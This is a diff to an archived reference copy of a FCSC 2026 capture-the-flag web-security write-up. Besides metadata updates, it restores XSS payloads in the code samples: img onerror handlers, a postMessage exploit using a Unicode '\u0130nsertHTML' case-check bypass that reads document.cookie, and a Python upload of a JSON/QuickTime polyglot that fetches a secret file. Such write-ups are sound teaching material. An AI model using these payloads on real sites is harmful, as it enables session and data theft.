@@ -6,9 +6,9 @@ resource: "https://web.archive.org/web/20260418230027/https://mizu.re/post/fcsc-
 tags: [article, webseclist-reference, en, mizu-re, parser-differential, request-smuggling, unicode, dom-clobbering, mutation-xss, xss, path-traversal, sanitizer-bypass, postmessage, mime, owasp-a01-2021, owasp-a03-2021, owasp-a05-2021, owasp-a08-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-14T01:17:49+00:00"
+  at: "2026-08-16T00:00:52+00:00"
 status: stable
-stale_after: 2027-08-14
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://web.archive.org/web/20260418230027/https://mizu.re/post/fcsc-2026-writeups"
@@ -25,7 +25,7 @@ canonical_url: "https://mizu.re/post/fcsc-2026-writeups"
 cited_by:
   - "2026-ai.md:58"
 commit: ""
-content_sha256: 276742f3c6160bd98a34d3a8d8ffbd21dca7ad78ea4cc39bb0a72355eddc4c99
+content_sha256: eebfda780c2a597d8a8a8c1bdec97cba844f32f19727e238bc744d1f3186cb80
 depth: full
 depth_reason: default
 kind: article
@@ -38,7 +38,7 @@ publisher_english: ""
 raw_sha256: 523038599e1bf25611e2932d5fb36b57b5696e4f0829aba87dac6b3da850c175
 retrieved_from: "https://mizu.re/post/fcsc-2026-writeups"
 retrieved_kind: stored
-retrieved_utc: "2026-08-14T01:17:49+00:00"
+retrieved_utc: "2026-08-16T00:00:52+00:00"
 slug: mizu-re-fcsc-2026-writeups
 snapshot: 20260418230027
 title_english: ""
@@ -53,7 +53,7 @@ translation_of: ""
 - Published: date not stated
 - Original: <https://web.archive.org/web/20260418230027/https://mizu.re/post/fcsc-2026-writeups>
 - Current location: <https://mizu.re/post/fcsc-2026-writeups>
-- Preserved from: https://mizu.re/post/fcsc-2026-writeups (stored) on 2026-08-14
+- Preserved from: https://mizu.re/post/fcsc-2026-writeups (stored) on 2026-08-16
 - Capture timestamp: 20260418230027
 - Licence: unknown
 
@@ -309,9 +309,9 @@ range.selectNodeContents(el);
 window.getSelection().addRange(range);
 
 // Execute the document command
-document.execCommand("insertHTML", false, "<img src=x
-document.execCommand("inserthtml", false, "<img src=x
-document.execCommand("INSERTHTML", false, "<img src=x >
+document.execCommand("insertHTML", false, "<img src=x onerror=alert(1)>");
+document.execCommand("inserthtml", false, "<img src=x onerror=alert(2)>");
+document.execCommand("INSERTHTML", false, "<img src=x onerror=alert(3)>");
 ```
 
 fig. 7: Demo of document.execCommand case insensitivity.
@@ -337,7 +337,7 @@ for (let i=0; i<=0xFFF; i++) {
   window.getSelection().addRange(range);
 
   // Execute the document command
-  document.execCommand(String.fromCharCode(i) + "nsertHTML", false, "<img src=x >");
+  document.execCommand(String.fromCharCode(i) + "nsertHTML", false, "<img src=x onerror='alert(" + i + ")'>");
 }
 // Results: 73, 105, 304
 ```
@@ -347,7 +347,7 @@ fig. 8: Fuzzer for a Unicode character bypassing the case check.
 As a result, the following postMessage would get the FLAG:
 
 ```js
-postMessage({ type: 'FISH_CLICKED', data: {command: '\u0130nsertHTML', value: '<img src="x" >', targetWord: 'shrimp'}}, "*")
+postMessage({ type: 'FISH_CLICKED', data: {command: '\u0130nsertHTML', value: '<img src="x" onerror="console.log(document.cookie)">', targetWord: 'shrimp'}}, "*")
 ```
 
 fig. 9: postMessage payload triggering the XSS.
@@ -452,7 +452,7 @@ Now that we have all the pieces, we just need to bring everything together to ge
 
     if (window.location.search === "?xss") {
         console.log("[STEP 3]> Sending the execCommand unicode postMessage...");
-        parent.postMessage({ type: 'FISH_CLICKED', data: {command: '\u0130nsertHTML', value: '<img src="x" >', targetWord: 'shrimp'}}, "*")
+        parent.postMessage({ type: 'FISH_CLICKED', data: {command: '\u0130nsertHTML', value: '<img src="x" onerror="console.log(document.cookie)">', targetWord: 'shrimp'}}, "*")
     }
 </script>
 ```
@@ -806,7 +806,7 @@ bot_port = int(BOT.split(":")[1].strip())
 
 # Upload an application/json | image/x-quicktime polyglot abusing libmagic header length limit
 print("[+] Uploading the polyglot")
-r = post(f"{URL}/api/v1/image?action=upload", files={"image": ("image.png", f'{{"aaidsci":"{"a"*0xFFFFF}","content":"<img src=x  => res.json()).then(data => console.log(data.flag))\'>"}}'.encode())})
+r = post(f"{URL}/api/v1/image?action=upload", files={"image": ("image.png", f'{{"aaidsci":"{"a"*0xFFFFF}","content":"<img src=x onerror=\'fetch(`/api/v1/image?action=read&filename=secret-recipe.txt`).then(res => res.json()).then(data => console.log(data.flag))\'>"}}'.encode())})
 if "error" in r.text:
     print(r.text)
     exit(1)
@@ -1147,9 +1147,9 @@ const { JSDOM } = require("jsdom");
 
 const { window } = new JSDOM();
 var elem = window.document.createElement("Ḿizu");
-elem.setAttribute("x", "<img src=x
+elem.setAttribute("x", "<img src=x onerror=alert()>");
 
-console.log(elem.outerHTML); // <Ḿizu x="<img src=x >
+console.log(elem.outerHTML); // <Ḿizu x="<img src=x onerror=alert()>"></Ḿizu>
 ```
 
 fig. 61: JSDOM outerHTML serialization without attribute encoding.
